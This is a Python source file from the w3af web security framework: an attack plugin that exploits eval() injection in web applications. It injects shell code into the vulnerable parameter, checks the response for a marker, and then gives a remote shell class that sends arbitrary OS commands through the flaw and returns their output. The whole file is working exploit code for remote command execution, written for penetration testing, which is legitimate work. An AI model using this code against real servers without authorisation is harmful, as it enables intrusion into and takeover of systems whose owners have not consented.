'''
eval.py

Copyright 2009 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import core.controllers.output_manager as om
import plugins.attack.payloads.shell_handler as shell_handler

from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.exceptions import w3afException
from core.data.kb.exec_shell import ExecShell
from plugins.attack.payloads.decorators.exec_decorator import exec_debug


class eval(AttackPlugin):
    '''
    Exploit eval() vulnerabilities.

    :author: Andres Riancho (andres.riancho@gmail.com)
    '''

    def __init__(self):
        AttackPlugin.__init__(self)

        # Internal variables
        self._shell_code = None

    def get_attack_type(self):
        '''
        :return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'

    def get_kb_location(self):
        '''
        This method should return the vulnerability name (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds an
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        ( attack.os_commanding ) should return 'os_commanding' in this method.
        '''
        return ['eval',]

    def _generate_shell(self, vuln_obj):
        '''
        :param vuln_obj: The vuln to exploit.
        :return: A shell object based on the vuln that is passed as parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verify_vuln(vuln_obj):
            # Create the shell object
            shell_obj = EvalShell(vuln_obj, self._uri_opener, self.worker_pool,
                                  self._shell_code)
            return shell_obj
        else:
            return None

    def _verify_vuln(self, vuln_obj):
        '''
        This command verifies a vuln. This is really hard work!

        :param vuln_obj: The vulnerability to exploit.
        :return : True if vuln can be exploited.
        '''
        # Get the shells
        extension = vuln_obj.get_url().get_extension()
        # I get a list of tuples with code and extension to use
        shell_code_list = shell_handler.get_shell_code(extension)

        for code, real_extension in shell_code_list:
            # Prepare for exploitation...
            function_reference = getattr(self._uri_opener,
                                         vuln_obj.get_method())
            data_container = vuln_obj.get_dc()
            data_container[vuln_obj.get_var()] = code

            try:
                http_res = function_reference(vuln_obj.get_url(),
                                              str(data_container))
            except w3afException, w3:
                msg = 'An error ocurred while trying to exploit the eval()'\
                      ' vulnerability. Original exception: "%s".'
                om.out.debug(msg % w3)
            else:
                if shell_handler.SHELL_IDENTIFIER in http_res.get_body():
                    msg = 'Sucessfully exploited eval() vulnerability using'\
                          ' the following code snippet: "%s...".' % code[:35]
                    om.out.debug(msg)
                    self._shell_code = code
                    return True

        # All failed!
        return False

    def get_root_probability(self):
        '''
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.8

    def get_long_desc(self):
        '''
        :return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits eval() vulnerabilities and returns a remote shell.
        '''


class EvalShell(ExecShell):

    def __init__(self, vuln, uri_opener, worker_pool, code):
        super(EvalShell, self).__init__(vuln, uri_opener, worker_pool)
        
        self._shell_code = code
        
    @exec_debug
    def execute(self, command):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        :param command: The command to handle ( ie. "ls", "whoami", etc ).
        :return: The result of the command.
        '''
        # Lets send the command.
        function_reference = getattr(self._uri_opener, self.get_method())
        exploit_dc = self.get_dc()
        exploit_dc['cmd'] = command
        exploit_dc[self.get_var()] = self._shell_code
        try:
            response = function_reference(self.get_url(), str(exploit_dc))
        except w3afException, w3:
            msg = 'An error occurred while trying to exploit the eval()'\
                  ' vulnerability (sending command %s). Original exception: "%s".'
            om.out.debug(msg % (command, w3))
            return 'Unexpected error, please try again.'
        else:
            return shell_handler.extract_result(response.get_body())

    def get_name(self):
        return 'eval_shell'
